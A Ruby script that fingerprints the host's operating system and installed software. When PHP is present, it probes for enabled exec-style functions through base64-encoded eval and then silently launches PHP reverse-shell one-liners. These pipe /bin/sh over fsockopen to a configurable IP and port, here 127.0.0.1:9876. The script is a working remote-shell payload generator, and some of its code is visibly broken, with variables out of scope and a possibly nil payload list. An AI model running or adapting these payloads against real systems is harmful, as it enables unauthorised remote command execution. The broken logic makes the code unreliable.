require 'rbconfig'
require 'open3'
require 'base64'
require 'json'
require 'timeout'

mutex = Mutex.new
condition = ConditionVariable.new
connected = false

$system_profile = {
  'OS' => 'Unknown',
  'Installed Software' => [],
  'OS Details' => ''
}

def execute_command_async(command)
  Thread.report_on_exception = false
  thread = Thread.new do
    begin
      stdout, stderr, status = Timeout.timeout(2) do
        Open3.capture3(command)
        mutex.synchronize do
          connected = true
          condition.broadcast
        end
      end
    rescue Timeout::Error
    end
  end
end

def construct_payloads(functions, ip, port)
  payloads = {}
  functions.each_key do |function|
    command = case function
              when 'exec'
                "php -r '$sock=fsockopen(\"#{ip}\",#{port});exec(\"/usr/bin/sh <&3 >&3 2>&3\");'"
              when 'system'
                "php -r '$sock=fsockopen(\"#{ip}\",#{port});system(\"/usr/bin/sh <&3 >&3 2>&3\");'"
              when 'passthru'
                "php -r '$sock=fsockopen(\"#{ip}\",#{port});passthru(\"/usr/bin/sh <&3 >&3 2>&3\");'"
              when 'popen'
                "php -r '$sock=fsockopen(\"#{ip}\",#{port});$handle=popen(\"/usr/bin/sh <&3 >&3 2>&3\", \"r\");while(!feof($handle)) { echo fread($handle, 2048); } pclose($handle);'"
              when 'proc_open'
                "php -r '$sock=fsockopen(\"#{ip}\",#{port});$descriptorspec=array(0=>array(\"pipe\", \"r\"), 1=>array(\"pipe\", \"w\"), 2=>array(\"pipe\", \"w\"));$process=proc_open(\"/usr/bin/sh\", $descriptorspec, $pipes);if (is_resource($process)) { while ($line = fgets($pipes[1])) { echo $line; } fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); }'"
              end
    payloads[function] = command
  end
  payloads
end

def check_php_function_availability(ip_address, port_number)
  php_code = <<-PHP
    $functions = array('exec', 'system', 'passthru', 'popen', 'proc_open');
    $results = array();
    foreach ($functions as $function) {
        $results[$function] = (function_exists($function) && is_callable($function)) ? 'enabled' : 'disabled';
    }
    $results['fsockopen'] = function_exists('fsockopen') && is_callable('fsockopen') ? 'enabled' : 'disabled';
    echo json_encode($results);
  PHP
  encoded_php = Base64.strict_encode64(php_code)
  command = "php -r \"eval(base64_decode('#{encoded_php}'));\""
  stdout, stderr, status = Open3.capture3(command)
  raise "Error executing PHP script: #{stderr}" unless status.success?
  results = JSON.parse(stdout)
  if results['fsockopen'] == 'enabled'
    results.delete('fsockopen')
    payloads = construct_payloads(results, ip_address, port_number) if results.values.include?('enabled')
    payloads.each do |function, command|
      execute_command_async(command)
    end
  else
    "fsockopen is disabled, cannot construct payload."
  end
end

def check_and_execute_if_php_installed(ip, port)
  if $system_profile['Installed Software'].any? { |software| software =~ /php/i }
    puts "PHP is installed. Checking PHP function availability..."
    result = check_php_function_availability(ip, port)
    puts result
  else
    puts "PHP is not installed. Skipping PHP function availability check."
  end
end

def detect_and_list_software
  case $system_profile['OS']
    when 'Windows'
      list_installed_software_windows
      check_and_execute_if_php_installed("127.0.0.1", 9876)
    when 'macOS'
      list_installed_software_macos
      check_and_execute_if_php_installed("127.0.0.1", 9876)
    when 'Linux'
      if File.directory?("/var/lib/dpkg")
      list_installed_software_linux
      check_and_execute_if_php_installed("127.0.0.1", 9876)
    elsif File.directory?("/var/lib/rpm")
      list_installed_software_linux_rpm
      check_and_execute_if_php_installed("127.0.0.1", 9876)
    else
      puts "Unsupported Linux distribution or package manager."
    end
  else
    puts "No software listing function available for #{$system_profile['OS']}"
  end
end

def list_installed_software_windows
  software_list = `wmic product get name, version`
  apps = software_list.split("\n")[1..-1].map do |line|
    line.strip unless line.strip.empty?
    end.compact
  $system_profile['Installed Software'] = apps
end

def list_installed_software_macos
  software_list = `system_profiler SPApplicationsDataType`
  apps = software_list.split("\n\n").map do |block|
    if block.include?("Application:")
      name = block.match(/Application:\s*(.+?)\s*$/)[1]
      "#{name}"
    end
  end.compact
  $system_profile['Installed Software'] = apps
end

def list_installed_software_linux
  software_list = `dpkg-query -l`
  software_list = software_list.force_encoding('UTF-8')
  apps = software_list.split("\n")[5..-1].map do |line|
    parts = line.split
    "#{parts[1]} #{parts[2]}" if parts.length > 2
  end.compact
  $system_profile['Installed Software'] = apps
end

def list_installed_software_linux_rpm
  software_list = `rpm -qa`
  apps = software_list.split("\n").map(&:strip)
  $system_profile['Installed Software'] = apps
end

def os_info
  os = RbConfig::CONFIG['host_os']
  case os
  when /mswin|msys|mingw|cygwin|bccwin|wince|emc/
    $system_profile['OS'] = "Windows"
  when /darwin|mac os/
    $system_profile['OS'] = "macOS"
  when /linux/
    $system_profile['OS'] = "Linux"
  when /solaris|bsd/
    $system_profile['OS'] = "Unix"
  else
    $system_profile['OS'] = "Unknown"
  end
  $system_profile['OS Details'] = case $system_profile['OS']
                                  when "Windows"
                                    `systeminfo`
                                  when "macOS"
                                    `sw_vers`
                                  when "Linux"
                                    `cat /etc/*-release`
                                  when "Unix"
                                    `uname -a`
                                  else
                                    "OS information not retrievable"
                                  end
  detect_and_list_software
  "#{$system_profile['OS']} information: \n#{$system_profile['OS Details']}"
end

puts os_info
